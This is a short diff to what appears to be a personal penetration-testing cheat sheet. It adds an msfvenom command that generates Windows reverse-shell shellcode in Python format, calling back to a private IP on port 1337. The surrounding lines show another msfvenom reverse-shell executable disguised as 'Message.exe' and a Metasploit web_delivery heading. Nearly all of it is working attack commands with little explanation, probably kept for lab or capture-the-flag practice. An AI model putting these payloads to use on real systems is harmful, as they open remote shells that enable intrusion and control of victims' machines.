@@ -42,6 +42,8 @@ exploit -j
 
 - msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.1.25 LPORT=8888 -f exe -o Message.exe
 
+- msfvenom -p windows/shell_reverse_tcp LHOST=10.9.2.251 LPORT=1337 -b "\x00" -f python EXITFUNC=thread
+
 ## Creating webupload payload windows
 
 - use exploit/multi/script/web_delivery
